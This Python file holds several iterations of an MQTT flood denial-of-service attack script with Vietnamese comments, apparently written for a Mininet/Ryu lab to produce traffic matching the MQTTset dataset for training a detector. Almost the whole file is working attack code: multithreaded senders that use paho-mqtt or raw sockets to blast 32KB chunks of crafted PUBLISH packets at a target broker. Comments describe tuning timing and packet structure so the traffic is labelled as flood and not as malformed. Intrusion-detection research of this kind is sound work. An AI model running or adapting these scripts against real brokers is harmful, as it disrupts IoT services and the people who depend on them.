# #!/usr/bin/env python3
# """
# Attack 1 — MQTT Flood (DoS)
# Gửi hàng nghìn PUBLISH message liên tục đến broker để làm quá tải.
# Dùng multi-thread để tăng tốc độ tấn công.

# Chạy:
#     python3 attack1_mqtt_flood.py --host 10.0.0.10 --port 1883 --threads 10 --count 5000
# """

# import paho.mqtt.client as mqtt
# import time
# import argparse
# import threading
# import random
# import json # Thêm thư viện json
# import string
# import logging
# from datetime import datetime

# logging.basicConfig(
#     level=logging.INFO,
#     format="%(asctime)s [%(threadName)s] %(levelname)s — %(message)s"
# )
# log = logging.getLogger(__name__)

# # ── Thống kê toàn cục ──────────────────────────────────────────────────────────
# stats_lock  = threading.Lock()
# total_sent  = 0
# total_error = 0
# start_time  = None


# def valid_payload() -> str:
#     # Mô phỏng gói tin của một cảm biến nhiệt độ hợp lệ
#     return json.dumps({
#         "device": "sensor-flood",
#         "temperature": round(random.uniform(20.0, 35.0), 2),
#         "humidity": round(random.uniform(40.0, 80.0), 2)
#     })

# def flood_worker(broker_host: str, broker_port: int,
#                  topic: str, count: int, qos: int, worker_id: int):
#     global total_sent, total_error

#     client_id = f"flood-attacker-{worker_id}-{random.randint(1000, 9999)}"
#     client = mqtt.Client(client_id=client_id)

#     try:
#         # Tăng keepalive lên để tránh bị ngắt kết nối (gây ra nhãn bruteforce)
#         client.connect(broker_host, broker_port, keepalive=120)
#         client.loop_start() # Khởi động vòng lặp nền để xử lý ACK

#         success_count = 0
#         error_count = 0

#         # 2. SỬA VÒNG LẶP PUBLISH: Thêm độ trễ siêu nhỏ
#         for _ in range(count):
#             try:
#                 # Gửi payload hợp lệ
#                 msg_info = client.publish(topic, valid_payload(), qos=qos)
#                 msg_info.wait_for_publish(timeout=1) # Chờ confirm để đảm bảo gói tin đi nguyên vẹn
#                 success_count += 1
                
#                 # BÍ QUYẾT: Thêm độ trễ 1-2 mili-giây. 
#                 # Đủ nhanh để tạo Time Delta nhỏ (ra nhãn Flood)
#                 # Đủ chậm để Switch/Broker không làm vỡ gói tin (Tránh nhãn Malformed)
#                 time.sleep(0.002) 
#             except Exception:
#                 error_count += 1

#         with stats_lock:
#             total_sent += success_count
#             total_error += error_count

#         client.loop_stop()
#         client.disconnect()

#     except Exception as e:
#         log.error(f"[Worker {worker_id}] Lỗi kết nối: {e}")

# def main():
#     parser = argparse.ArgumentParser(description="MQTT Flood Attack (DoS)")
#     parser.add_argument("--host",    default="127.0.0.1",      help="IP broker MQTT")
#     parser.add_argument("--port",    type=int, default=1883,   help="Port broker")
#     parser.add_argument("--topic",   default="iot/sensor/data",help="Topic đích")
#     parser.add_argument("--threads", type=int, default=5,      help="Số thread tấn công")
#     parser.add_argument("--count",   type=int, default=2000,   help="Số message / thread")
#     parser.add_argument("--qos",     type=int, default=0,      help="QoS level (0/1/2)")
#     args = parser.parse_args()

#     global start_time
#     total_msgs = args.threads * args.count

#     log.info("=" * 60)
#     log.info("  ATTACK 1 — MQTT FLOOD (DoS)")
#     log.info(f"  Target  : {args.host}:{args.port}")
#     log.info(f"  Topic   : {args.topic}")
#     log.info(f"  Threads : {args.threads}  |  Msgs/thread: {args.count}")
#     log.info(f"  Total   : {total_msgs} messages")
#     log.info("=" * 60)

#     start_time = time.time()
#     threads = []
#     for i in range(args.threads):
#         t = threading.Thread(
#             target=flood_worker,
#             args=(args.host, args.port, args.topic, args.count, args.qos, i + 1),
#             name=f"Flood-{i+1}"
#         )
#         threads.append(t)
#         t.start()

#     for t in threads:
#         t.join()

#     elapsed = time.time() - start_time
#     rate    = total_sent / elapsed if elapsed > 0 else 0

#     log.info("=" * 60)
#     log.info(f"  KẾT QUẢ FLOOD ATTACK")
#     log.info(f"  Thời gian   : {elapsed:.2f}s")
#     log.info(f"  Tổng gửi    : {total_sent}")
#     log.info(f"  Lỗi         : {total_error}")
#     log.info(f"  Tốc độ      : {rate:.1f} msg/s")
#     log.info("=" * 60)

#     # ── Lưu log CSV để evaluation ──────────────────────────────────────────────
#     with open("attack1_flood_log.csv", "w") as f:
#         f.write("attack_type,target,total_sent,total_error,duration_s,rate_msg_s,timestamp\n")
#         f.write(f"mqtt_flood,{args.host}:{args.port},{total_sent},{total_error},"
#                 f"{elapsed:.2f},{rate:.1f},{datetime.now().isoformat()}\n")
#     log.info("  Log đã lưu → attack1_flood_log.csv")


# if __name__ == "__main__":
#     main()


# #!/usr/bin/env python3
# import socket
# import time
# import argparse
# import threading
# import logging

# logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
# log = logging.getLogger("FloodAttack")

# def raw_flood_worker(target_ip, target_port, rate, thread_id):
#     # 1. Gói CONNECT chuẩn
#     connect_pkt = b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test'
    
#     # 2. Tạo đúng gói tin PUBLISH trong file flood.csv
#     # - Header: \x30 (Publish QoS 0)
#     # - Rem Length: \x10 (16 bytes)
#     # - Topic Len: \x00\x0b (11 bytes)
#     # - Topic: "Temperature"
#     # - Payload: "123" (3 bytes)
#     # Tổng cộng = 18 bytes.
#     single_publish = b'\x30\x10\x00\x0bTemperature123'
    
#     # 3. VŨ KHÍ BÍ MẬT: Nhồi 1820 gói MQTT vào 1 cục TCP frame duy nhất
#     # 18 bytes * 1820 = đúng 32760 bytes (Khớp 100% với cột tcp.len trong dataset)
#     massive_payload = single_publish * 1820
    
#     delay = 1.0 / rate if rate > 0 else 0
    
#     while True:
#         try:
#             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.settimeout(2)
            
#             s.connect((target_ip, target_port))
#             s.send(connect_pkt)
#             time.sleep(0.01) # Đợi Broker phản hồi CONNACK
            
#             # Bắn lụt các cục TCP 32KB
#             for _ in range(500):
#                 s.send(massive_payload)
#                 if delay > 0:
#                     time.sleep(delay)
#             s.close()
#         except Exception:
#             # Bị Ryu chặn thì sẽ văng lỗi Timeout
#             pass

# if __name__ == "__main__":
#     parser = argparse.ArgumentParser()
#     parser.add_argument("--host", required=True, help="IP Broker")
#     parser.add_argument("--port", type=int, default=1883)
#     parser.add_argument("--threads", type=int, default=3)
#     parser.add_argument("--rate", type=int, default=0, help="0 = Max speed")
#     args = parser.parse_args()

#     log.info(f"[*] Khởi chạy CHUNKED MQTT FLOOD tới {args.host}:{args.port}")
#     log.info("[*] Gửi 32760 bytes/packet (Khớp 100% với file flood.csv của MQTTset)")
    
#     for i in range(args.threads):
#         t = threading.Thread(target=raw_flood_worker, args=(args.host, args.port, args.rate, i))
#         t.daemon = True
#         t.start()
        
#     try:
#         while True:
#             time.sleep(1)
#     except KeyboardInterrupt:
#         log.info("Đã dừng tấn công.")

'''
    Khoong dung MQTT client library nào có thể tạo ra gói tin PUBLISH với payload khổng lồ 32760 bytes như trong dataset flood.csv.
    Vì vậy, chúng ta sẽ tự xây dựng gói tin MQTT thô (raw), gui den socket chuwf khong dung MQTT client
    Do thu vien paho mqtt client co gioi han payload va tcp frame, nen khong the tao ra duoc gói tin PUBLISH 32760 bytes nhu trong dataset flood.csv.
    Nhưng vấn đề nằm ở chỗ: paho-mqtt là một thư viện "người tốt".

    Trước khi gửi, nó kiểm tra xem Broker có đang quá tải không.

    Nó lắng nghe và xử lý các gói tin ACK (Xác nhận) một cách từ tốn.

    Nếu mạng nghẽn, nó tự động giảm tốc độ gửi lại (TCP Congestion Control).
'''

# #!/usr/bin/env python3
# import socket
# import time
# import argparse
# import threading
# import logging
# import random
# import string

# logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
# log = logging.getLogger("FloodAttack")

# def generate_random_chunk():
#     """
#     Sinh ra một khối TCP 32KB chứa toàn dữ liệu rác ngẫu nhiên.
#     Nhưng vẫn giữ cấu trúc độ dài chuẩn để Tshark và AI không đánh nhầm sang Malformed.
#     """
#     # 1. Tạo 14 byte dữ liệu rác hoàn toàn ngẫu nhiên (vd: 'Xk9pL2mB4vC1zQ')
#     garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=14)).encode()
    
#     # 2. Gắn Header MQTT Publish vào dữ liệu rác
#     # \x30: Publish
#     # \x10: Remaining Length = 16 bytes
#     # \x00\x0b: Tshark sẽ hiểu 11 byte đầu của chuỗi garbage là Topic, 3 byte sau là Payload.
#     single_publish = b'\x30\x10\x00\x0b' + garbage
    
#     # 3. Nhân bản lên 1820 lần để tạo thành một cục TCP khổng lồ (Đúng 32760 bytes)
#     return single_publish * 1820


# def raw_flood_worker(target_ip, target_port, rate, thread_id):
#     connect_pkt = b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test'
#     delay = 1.0 / rate if rate > 0 else 0
    
#     while True:
#         try:
#             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.settimeout(2)
#             s.connect((target_ip, target_port))
#             s.send(connect_pkt)
#             time.sleep(0.01)
            
#             for _ in range(500):
#                 # Mỗi lần gửi sẽ tạo ra một cục rác ngẫu nhiên MỚI HOÀN TOÀN
#                 massive_random_payload = generate_random_chunk()
#                 s.send(massive_random_payload)
                
#                 if delay > 0:
#                     time.sleep(delay)
#             s.close()
#         except Exception:
#             pass # Socket bị Ryu Controller đóng

# if __name__ == "__main__":
#     parser = argparse.ArgumentParser()
#     parser.add_argument("--host", required=True, help="IP Broker")
#     parser.add_argument("--port", type=int, default=1883)
#     parser.add_argument("--threads", type=int, default=3)
#     parser.add_argument("--rate", type=int, default=0)
#     args = parser.parse_args()

#     log.info(f"[*] Khởi chạy FLOOD bằng DỮ LIỆU RÁC NGẪU NHIÊN tới {args.host}:{args.port}")
    
#     for i in range(args.threads):
#         t = threading.Thread(target=raw_flood_worker, args=(args.host, args.port, args.rate, i))
#         t.daemon = True
#         t.start()
        
#     try:
#         while True:
#             time.sleep(1)
#     except KeyboardInterrupt:
#         log.info("Đã dừng tấn công.")


# #!/usr/bin/env python3
# import socket
# import time
# import argparse
# import threading
# import logging
# import random
# import string
# import sys
# from datetime import datetime

# # Cấu hình logging nhìn cho chuyên nghiệp
# logging.basicConfig(
#     level=logging.INFO, 
#     format="%(asctime)s [%(levelname)s] %(message)s"
# )
# log = logging.getLogger("FloodAttack")

# # Biến toàn cục để thống kê
# stats_lock = threading.Lock()
# total_sent_msgs = 0
# total_errors = 0

# def generate_random_chunk():
#     """
#     Giữ nguyên logic sinh dữ liệu ngẫu nhiên nhưng đúng cấu trúc MQTT
#     để AI detect [flood] chuẩn nhất.
#     """
#     garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=14)).encode()
#     # \x30\x10: Publish, RemLen=16 | \x00\x0b: TopicLen=11
#     single_publish = b'\x30\x10\x00\x0b' + garbage
#     return single_publish * 1820 # Đúng 32760 bytes như dataset

# def raw_flood_worker(target_ip, target_port, rate, count_per_thread, thread_id):
#     global total_sent_msgs, total_errors
    
#     connect_pkt = b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test'
#     delay = 1.0 / rate if rate > 0 else 0
    
#     local_sent = 0
#     local_error = 0
    
#     try:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.settimeout(2)
#         s.connect((target_ip, target_port))
#         s.send(connect_pkt)
#         time.sleep(0.01)
        
#         # Thay 'while True' bằng vòng lặp có số lượng cụ thể để tự thoát
#         for _ in range(count_per_thread):
#             try:
#                 chunk = generate_random_chunk()
#                 s.sendall(chunk)
#                 local_sent += 1820 # 1 chunk chứa 1820 tin nhắn
#                 if delay > 0:
#                     time.sleep(delay)
#             except:
#                 local_error += 1820
#                 break # Dừng nếu bị Block
#         s.close()
#     except Exception:
#         local_error += (count_per_thread * 1820)

#     # Cập nhật thống kê toàn cục
#     with stats_lock:
#         total_sent_msgs += local_sent
#         total_errors += local_error

# if __name__ == "__main__":
#     parser = argparse.ArgumentParser(description="MQTT Raw Flood Attack")
#     parser.add_argument("--host", required=True, help="IP Broker")
#     parser.add_argument("--port", type=int, default=1883)
#     parser.add_argument("--threads", type=int, default=5, help="Số luồng")
#     parser.add_argument("--count", type=int, default=20, help="Số lần gửi chunk mỗi luồng")
#     parser.add_argument("--rate", type=int, default=0, help="Tốc độ (0 là tối đa)")
#     args = parser.parse_args()

#     print("\n" + "="*60)
#     print("  🔥 ATTACK 1 — RAW MQTT FLOOD (CHUNKED MODE)")
#     print(f"  🎯 Target IP  : {args.host}:{args.port}")
#     print(f"  🧵 Threads    : {args.threads}")
#     print(f"  📦 Chunks/Th  : {args.count} (~{args.count * 1820} msgs)")
#     print("="*60)

#     start_time = time.time()
#     thread_list = []

#     for i in range(args.threads):
#         t = threading.Thread(target=raw_flood_worker, 
#                              args=(args.host, args.port, args.rate, args.count, i))
#         thread_list.append(t)
#         t.start()
        
#     # Chờ tất cả các thread làm xong việc
#     for t in thread_list:
#         t.join()

#     duration = time.time() - start_time
    
#     print("\n" + "="*60)
#     print("  📊 KẾT QUẢ TẤN CÔNG")
#     print(f"  ⏱️  Thời gian    : {duration:.2f} giây")
#     print(f"  📤 Tổng tin nhắn : {total_sent_msgs:,}")
#     print(f"  ❌ Lỗi/Bị chặn  : {total_errors:,}")
#     if duration > 0:
#         print(f"  ⚡ Tốc độ trung bình: {total_sent_msgs/duration:,.1f} msg/s")
#     print("="*60)
    
#     print("\n[*] Hoàn thành kịch bản. Tự động quay lại Terminal...")
#     sys.exit(0) # Thoát về Mininet


#!/usr/bin/env python3
import socket
import time
import argparse
import threading
import logging
import random
import string
import sys

# Cấu hình hiển thị
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
log = logging.getLogger("FloodAttack")

def generate_random_chunk():
    """Tạo khối TCP 32KB chứa 1820 gói MQTT rác ngẫu nhiên."""
    garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=14)).encode()
    # Cấu trúc: \x30\x10 (Publish, Len 16) | \x00\x0b (Topic Len 11)
    single_publish = b'\x30\x10\x00\x0b' + garbage
    return single_publish * 1820

def raw_flood_worker(target_ip, target_port, rate, iterations, thread_id):
    """
    Backend giữ nguyên logic socket cũ.
    iterations: Số lần lặp lại việc mở socket và bắn (thay cho while True).
    """
    connect_pkt = b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test'
    delay = 1.0 / rate if rate > 0 else 0
    
    # Chạy số lần nhất định để sau đó tự thoát
    for _ in range(iterations):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send(connect_pkt)
            time.sleep(0.01)
            
            # Mỗi vòng lặp này bắn 500 phát chunk 32KB (~910,000 tin nhắn)
            for _ in range(500):
                chunk = generate_random_chunk()
                s.sendall(chunk)
                if delay > 0:
                    time.sleep(delay)
            s.close()
        except Exception:
            # Nếu bị Ryu block thì dừng vòng lặp này và thử lại (giống code cũ)
            time.sleep(0.1)
            continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True, help="IP Broker")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--threads", type=int, default=3)
    parser.add_argument("--rate", type=int, default=0)
    parser.add_argument("--iter", type=int, default=5, help="Số vòng lặp lớn (mỗi vòng bắn 500 chunks)")
    args = parser.parse_args()

    print("\n" + "="*60)
    print("  🔥 ATTACK 1 — HIGH-POWER RAW MQTT FLOOD")
    print(f"  🎯 Target IP  : {args.host}:{args.port}")
    print(f"  🧵 Threads    : {args.threads}")
    print(f"  🔄 Iterations : {args.iter} (Mỗi iter bắn ~910k msgs)")
    print("="*60)

    threads = []
    for i in range(args.threads):
        # Truyền args.iter để khống chế số lượng, không bị lặp vô tận
        t = threading.Thread(target=raw_flood_worker, 
                             args=(args.host, args.port, args.rate, args.iter, i),
                             name=f"Flood-{i}")
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()

    print("\n" + "="*60)
    print("  📊 KẾT QUẢ: Tấn công hoàn tất!")
    print(f"  [*] Đã thực hiện xong {args.iter} lượt tấn công cường độ cao.")
    print("="*60)
    print("[*] Tự động quay lại Terminal Mininet...")
    sys.exit(0)